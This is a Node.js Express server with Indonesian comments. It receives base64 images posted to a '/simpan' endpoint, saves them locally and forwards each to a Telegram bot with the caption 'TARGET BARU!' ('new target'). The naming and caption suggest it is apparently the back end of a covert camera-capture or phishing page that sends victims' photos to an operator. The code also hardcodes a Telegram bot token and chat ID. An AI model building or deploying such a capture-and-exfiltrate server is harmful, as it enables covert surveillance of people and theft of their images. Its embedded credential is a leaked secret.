const express = require('express');
const fs = require('fs');
const path = require('path');
const app = express();

// Limit diperbesar agar tidak error saat kirim foto kualitas tinggi
app.use(express.json({ limit: '20mb' }));
app.use(express.static('public'));

// Data Telegram Kamu
const BOT_TOKEN = '8604448756:AAHJ-CdHZpeiEM73TpjnMA5S2O5hu5oeU30'; 
const CHAT_ID = '7381262089';

// Pastikan folder uploads ada (biar tidak error saat simpan file)
const uploadDir = path.join(__dirname, 'uploads');
if (!fs.existsSync(uploadDir)){
    fs.mkdirSync(uploadDir);
}

app.post('/simpan', async (req, res) => {
    console.log("📩 Ada kiriman masuk...");
    const base64Data = req.body.image;

    if (!base64Data) {
        console.log("❌ Data gambar kosong!");
        return res.json({ status: false });
    }

    try {
        // 1. Proses Data Base64
        const base64Image = base64Data.split(';base64,').pop();
        const buffer = Buffer.from(base64Image, 'base64');
        const namaFile = `capture_${Date.now()}.jpg`;
        const filePath = path.join(uploadDir, namaFile);

        // 2. SIMPAN KE FOLDER UPLOADS
        fs.writeFile(filePath, buffer, (err) => {
            if (err) {
                console.log("❌ Gagal simpan ke folder:", err);
            } else {
                console.log(`✅ Tersimpan di folder: ${namaFile}`);
            }
        });

        // 3. KIRIM KE TELEGRAM
        const formData = new FormData();
        formData.append('chat_id', CHAT_ID);
        
        const blob = new Blob([buffer], { type: 'image/jpeg' });
        formData.append('photo', blob, namaFile);
        formData.append('caption', `📸 *TARGET BARU!*\n\nNama File: ${namaFile}\nWaktu: ${new Date().toLocaleString('id-ID')}`);
        formData.append('parse_mode', 'Markdown');

        console.log("📤 Mengirim ke Telegram...");
        const teleRes = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
            method: 'POST',
            body: formData
        });

        const hasil = await teleRes.json();
        
        if (hasil.ok) {
            console.log("🚀 Berhasil kirim ke Telegram!");
            res.json({ status: true });
        } else {
            console.log("❌ Gagal kirim ke Tele:", hasil.description);
            res.json({ status: false, error: hasil.description });
        }

    } catch (err) {
        console.error("🔥 Error Server:", err.message);
        res.json({ status: false, error: err.message });
    }
});

const PORT = process.env.PORT || 3000;
app.listen(PORT, () => console.log('🚀 Server Berjalan di Port ' + PORT));